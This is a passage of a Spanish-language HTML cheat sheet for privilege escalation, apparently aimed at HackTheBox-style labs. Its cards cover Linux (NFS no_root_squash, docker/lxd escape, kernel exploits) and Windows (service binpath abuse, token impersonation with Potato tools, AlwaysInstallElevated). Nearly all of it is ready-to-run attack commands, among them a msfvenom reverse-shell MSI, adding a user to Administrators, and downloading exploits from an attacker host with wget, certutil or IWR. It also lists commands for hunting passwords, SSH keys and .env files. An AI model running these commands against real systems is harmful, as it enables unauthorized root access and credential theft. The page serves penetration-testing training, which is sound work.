          <div class="pv-card-header" onclick="pvToggle('pv-nfs')"><span class="pv-badge linux">NFS</span><div class="pv-header-text"><h3>NFS no_root_squash</h3><p>Share NFS sin restricción de root</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Detectar</h4><span class="pv-cmd">cat /etc/exports</span><span class="pv-cmd">showmount -e ip</span></div>
            <div class="pv-section"><h4>Explotación desde tu máquina</h4><span class="pv-cmd">mount -t nfs ip:/share /mnt/nfs</span><span class="pv-cmd">cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash</span><span class="pv-cmd">(en víctima) /tmp/bash -p → shell root</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Squashed</span><span class="pv-htb-badge">Vulnix</span></div>
            <div class="pv-tip"><strong>Tip</strong>no_root_squash significa que root en tu máquina es root en el share NFS. Crea archivos SUID que el usuario víctima puede ejecutar.</div>
          </div>
        </div>

        <div class="pv-card" id="pv-docker">
          <div class="pv-card-header" onclick="pvToggle('pv-docker')"><span class="pv-badge linux">Docker</span><div class="pv-header-text"><h3>Grupo Docker / LXD</h3><p>Miembro del grupo docker = root implícito</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Detectar</h4><span class="pv-cmd">id (buscar docker o lxd en grupos)</span></div>
            <div class="pv-section"><h4>Docker escape</h4><span class="pv-cmd">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span></div>
            <div class="pv-section"><h4>LXD escape</h4><span class="pv-cmd">lxc image import alpine.tar.gz --alias myimage</span><span class="pv-cmd">lxc init myimage mycontainer -c security.privileged=true</span><span class="pv-cmd">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root</span><span class="pv-cmd">lxc start mycontainer && lxc exec mycontainer /bin/sh</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Tabby</span><span class="pv-htb-badge">Ready</span></div>
            <div class="pv-tip"><strong>Tip</strong>Ser miembro del grupo docker es equivalente a ser root. El comando monta todo el sistema de archivos del host dentro del contenedor.</div>
          </div>
        </div>

        <div class="pv-card pv-full" id="pv-kernel">
          <div class="pv-card-header" onclick="pvToggle('pv-kernel')"><span class="pv-badge linux">Kernel</span><div class="pv-header-text"><h3>Exploits de kernel</h3><p>Vulnerabilidades en el kernel de Linux — último recurso</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px">
              <div class="pv-section"><h4>Enumerar</h4><span class="pv-cmd">uname -a</span><span class="pv-cmd">cat /proc/version</span><span class="pv-cmd">./linux-exploit-suggester.sh</span><span class="pv-cmd">searchsploit linux kernel 4.x</span></div>
              <div class="pv-section"><h4>Exploits clásicos</h4><span class="pv-vuln">DirtyPipe (CVE-2022-0847)</span><span class="pv-vuln">DirtyCow (CVE-2016-5195)</span><span class="pv-vuln">PwnKit (CVE-2021-4034)</span><span class="pv-vuln">Baron Samedit (CVE-2021-3156)</span><span class="pv-vuln">Polkit (CVE-2021-3560)</span></div>
              <div class="pv-section"><h4>Compilar y ejecutar</h4><span class="pv-cmd">wget http://ip:8080/exploit.c</span><span class="pv-cmd">gcc exploit.c -o exploit</span><span class="pv-cmd">./exploit</span></div>
            </div>
            <div class="pv-tip"><strong>Tip</strong>Los exploits de kernel son el último recurso — pueden crashear el sistema. Prioriza siempre SUID, sudo, cron y PATH hijacking primero.</div>
          </div>
        </div>

      </div>
    </div>

    <div class="pv-subpanel" id="pv-windows">
      <div class="pv-grid">

        <div class="pv-card" id="pvw-services">
          <div class="pv-card-header" onclick="pvToggle('pvw-services')"><span class="pv-badge windows">Servicios</span><div class="pv-header-text"><h3>Servicios mal configurados</h3><p>Binario reemplazable o permisos débiles</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Enumerar</h4><span class="pv-cmd">sc qc NombreServicio</span><span class="pv-cmd">accesschk.exe -ucqv NombreServicio</span><span class="pv-cmd">wmic service get name,pathname,startmode | findstr /i "auto"</span></div>
            <div class="pv-section"><h4>Explotación</h4><span class="pv-cmd">sc config servicio binpath= "cmd /c net localgroup administrators user /add"</span><span class="pv-cmd">sc stop servicio && sc start servicio</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Steel Mountain</span><span class="pv-htb-badge">Alfred</span></div>
            <div class="pv-tip"><strong>Tip</strong>Si puedes modificar el binpath de un servicio que corre como SYSTEM, ejecútalo para añadir tu usuario al grupo Administrators.</div>
          </div>
        </div>

        <div class="pv-card" id="pvw-unquoted">
          <div class="pv-card-header" onclick="pvToggle('pvw-unquoted')"><span class="pv-badge windows">Unquoted</span><div class="pv-header-text"><h3>Unquoted Service Path</h3><p>Ruta del servicio sin comillas con espacios</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Detectar</h4><span class="pv-cmd">wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """</span><span class="pv-cmd">PowerUp.ps1: Invoke-AllChecks</span></div>
            <div class="pv-section"><h4>Explotación</h4><span class="pv-cmd">Ruta: C:\Program Files\My App\service.exe</span><span class="pv-cmd">Windows prueba: C:\Program.exe primero</span><span class="pv-cmd">Coloca tu exe en la primera ruta escribible</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Steel Mountain</span></div>
            <div class="pv-tip"><strong>Tip</strong>Si la ruta tiene espacios sin comillas, Windows intenta ejecutar el binario en cada espacio. Coloca un exe malicioso en la primera ruta escribible.</div>
          </div>
        </div>

        <div class="pv-card" id="pvw-tokens">
          <div class="pv-card-header" onclick="pvToggle('pvw-tokens')"><span class="pv-badge windows">Tokens</span><div class="pv-header-text"><h3>Token Impersonation</h3><p>SeImpersonatePrivilege → SYSTEM</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Detectar</h4><span class="pv-cmd">whoami /priv</span><span class="pv-cmd">Buscar: SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege</span></div>
            <div class="pv-section"><h4>Herramientas</h4><span class="pv-cmd">PrintSpoofer.exe -i -c cmd (Windows 10/2019+)</span><span class="pv-cmd">GodPotato.exe -cmd "net localgroup administrators user /add"</span><span class="pv-cmd">JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Jeeves</span><span class="pv-htb-badge">Conceal</span><span class="pv-htb-badge">Tally</span></div>
            <div class="pv-tip"><strong>Tip</strong>SeImpersonatePrivilege aparece en cuentas de servicio (IIS, MSSQL). PrintSpoofer para Windows 10/2019+. JuicyPotato para versiones más antiguas.</div>
          </div>
        </div>

        <div class="pv-card" id="pvw-alwaysinstall">
          <div class="pv-card-header" onclick="pvToggle('pvw-alwaysinstall')"><span class="pv-badge windows">AlwaysInstall</span><div class="pv-header-text"><h3>AlwaysInstallElevated</h3><p>MSI instalado siempre con permisos SYSTEM</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Detectar</h4><span class="pv-cmd">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><span class="pv-cmd">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></div>
            <div class="pv-section"><h4>Explotación</h4><span class="pv-cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=4444 -f msi -o shell.msi</span><span class="pv-cmd">msiexec /quiet /qn /i shell.msi</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Devel</span></div>
            <div class="pv-tip"><strong>Tip</strong>Si ambas claves del registro tienen valor 1, cualquier MSI se ejecuta como SYSTEM. Genera un MSI malicioso con msfvenom.</div>
          </div>
        </div>

        <div class="pv-card" id="pvw-sched">
          <div class="pv-card-header" onclick="pvToggle('pvw-sched')"><span class="pv-badge windows">Tareas</span><div class="pv-header-text"><h3>Tareas programadas</h3><p>Equivalente a cron en Windows</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Enumerar</h4><span class="pv-cmd">schtasks /query /fo LIST /v</span><span class="pv-cmd">Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"}</span></div>
            <div class="pv-section"><h4>Explotación</h4><span class="pv-cmd">Identificar script ejecutado como SYSTEM</span><span class="pv-cmd">Verificar si el script es writable</span><span class="pv-cmd">Inyectar reverse shell o añadir usuario admin</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Jeeves</span><span class="pv-htb-badge">Bounty</span></div>
            <div class="pv-tip"><strong>Tip</strong>Busca tareas que ejecuten scripts .ps1 o .bat que puedas modificar para inyectar un comando y añadirte como administrador.</div>
          </div>
        </div>

        <div class="pv-card" id="pvw-registry">
          <div class="pv-card-header" onclick="pvToggle('pvw-registry')"><span class="pv-badge windows">Registro</span><div class="pv-header-text"><h3>AutoRun y permisos de registro</h3><p>Claves ejecutadas al iniciar sesión</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>AutoRun</h4><span class="pv-cmd">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><span class="pv-cmd">reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></div>
            <div class="pv-section"><h4>Permisos débiles</h4><span class="pv-cmd">accesschk.exe -uvwqk HKLM\System\CurrentControlSet\Services</span><span class="pv-cmd">PowerUp: Get-ModifiableRegistryAutoRun</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Optimum</span></div>
            <div class="pv-tip"><strong>Tip</strong>Si puedes modificar una clave AutoRun que se ejecuta como SYSTEM, coloca tu payload ahí y espera o fuerza un reinicio.</div>
          </div>
        </div>

        <div class="pv-card pv-full" id="pvw-enum">
          <div class="pv-card-header" onclick="pvToggle('pvw-enum')"><span class="pv-badge windows">Enum</span><div class="pv-header-text"><h3>Enumeración post-explotación Windows</h3><p>Comandos esenciales tras obtener acceso</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px">
              <div class="pv-section"><h4>Sistema y usuario</h4><span class="pv-cmd">whoami /all</span><span class="pv-cmd">systeminfo</span><span class="pv-cmd">net user; net localgroup</span><span class="pv-cmd">ipconfig /all</span></div>
              <div class="pv-section"><h4>Procesos y servicios</h4><span class="pv-cmd">tasklist /v</span><span class="pv-cmd">sc query type= all state= all</span><span class="pv-cmd">netstat -ano</span></div>
              <div class="pv-section"><h4>Herramientas automáticas</h4><span class="pv-cmd">.\winPEAS.exe</span><span class="pv-cmd">.\PowerUp.ps1; Invoke-AllChecks</span><span class="pv-cmd">.\Seatbelt.exe -group=all</span><span class="pv-cmd">.\SharpHound.exe -c all</span></div>
            </div>
            <div class="pv-tip"><strong>Tip</strong>Transfiere winPEAS con: certutil -urlcache -f http://ip/winpeas.exe wp.exe o powershell: IWR http://ip/wp.exe -OutFile wp.exe</div>
          </div>
        </div>

      </div>
    </div>
  </div>

  <!-- COMANDOS -->
  <div class="sf-panel" id="sf-comandos">
    <div class="cmd-grid">
      <div class="cmd-card"><h3>Linux — búsqueda general</h3><span class="sf-cmd">find / -name "*.env" 2>/dev/null</span><span class="sf-cmd">find / -name "config.php" 2>/dev/null</span><span class="sf-cmd">find / -name "id_rsa" 2>/dev/null</span><span class="sf-cmd">find / -perm -4000 -type f 2>/dev/null</span><span class="sf-cmd">find / -writable -type f 2>/dev/null | grep -v /proc</span><span class="sf-cmd">getcap -r / 2>/dev/null</span></div>
      <div class="cmd-card"><h3>Linux — buscar credenciales</h3><span class="sf-cmd">grep -r "password" /var/www/ 2>/dev/null</span><span class="sf-cmd">grep -r "DB_PASS\|DB_PASSWORD" / 2>/dev/null</span><span class="sf-cmd">cat ~/.bash_history</span><span class="sf-cmd">cat /proc/self/environ | tr '\0' '\n'</span><span class="sf-cmd">env</span><span class="sf-cmd">sudo -l</span></div>
      <div class="cmd-card"><h3>Windows — PowerShell</h3><span class="sf-cmd">whoami /all</span><span class="sf-cmd">type %APPDATA%\...\ConsoleHost_history.txt</span><span class="sf-cmd">findstr /si password *.xml *.ini *.txt *.config</span><span class="sf-cmd">reg query HKLM /f password /t REG_SZ /s</span><span class="sf-cmd">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span><span class="sf-cmd">cmdkey /list</span></div>
      <div class="cmd-card"><h3>LFI — archivos a probar</h3><span class="sf-cmd">/etc/passwd</span><span class="sf-cmd">/etc/shadow</span><span class="sf-cmd">/var/log/apache2/access.log</span><span class="sf-cmd">/proc/self/environ</span><span class="sf-cmd">/var/www/html/.env</span><span class="sf-cmd">/var/www/html/wp-config.php</span><span class="sf-cmd">C:\Windows\win.ini</span><span class="sf-cmd">C:\Windows\System32\drivers\etc\hosts</span></div>
      <div class="cmd-card cmd-card-full"><h3>Herramientas automáticas post-explotación</h3><div class="cmd-inner"><div class="cmd-group"><p>Linux</p><span class="sf-cmd">./linpeas.sh</span><span class="sf-cmd">./linux-exploit-suggester.sh</span><span class="sf-cmd">./lse.sh -l 1</span><span class="sf-cmd">./pspy64</span></div><div class="cmd-group"><p>Windows</p><span class="sf-cmd">.\winPEAS.exe</span><span class="sf-cmd">.\PowerUp.ps1; Invoke-AllChecks</span><span class="sf-cmd">.\Seatbelt.exe -group=all</span><span class="sf-cmd">.\SharpHound.exe -c all</span></div><div class="cmd-group"><p>Transferir archivos</p><span class="sf-cmd">python3 -m http.server 8080</span><span class="sf-cmd">wget http://ip:8080/linpeas.sh</span><span class="sf-cmd">certutil -urlcache -f http://ip/f.exe f.exe</span><span class="sf-cmd">IWR http://ip/wp.exe -OutFile wp.exe</span></div></div></div>
    </div>
  </div>

</div>

<script>
function sfTab(e, tab) {
  document.querySelectorAll('.sf-tabs .sf-tab').forEach(function(t){ t.classList.remove('active'); });
  document.querySelectorAll('.sf-panel').forEach(function(p){ p.classList.remove('active'); });
  e.target.classList.add('active');
  document.getElementById('sf-' + tab).classList.add('active');
}

function sfFilter(panel, q) {
  var tbl = document.getElementById('tbl-' + panel);
  if (!tbl) return;
  var ql = q.toLowerCase();
  tbl.querySelectorAll('tbody tr').forEach(function(row) {
    if (row.querySelector('.sf-section-hdr')) return;
    row.classList.toggle('sf-hidden', ql && !row.textContent.toLowerCase().includes(ql));
  });
}

function pvTab(e, tab) {
  document.querySelectorAll('.pv-subtab').forEach(function(t){ t.classList.remove('active'); });
  document.querySelectorAll('.pv-subpanel').forEach(function(p){ p.classList.remove('active'); });
  e.target.classList.add('active');
  document.getElementById('pv-' + tab).classList.add('active');
}

function pvToggle(id) {
  document.getElementById(id).classList.toggle('open');
}
</script>
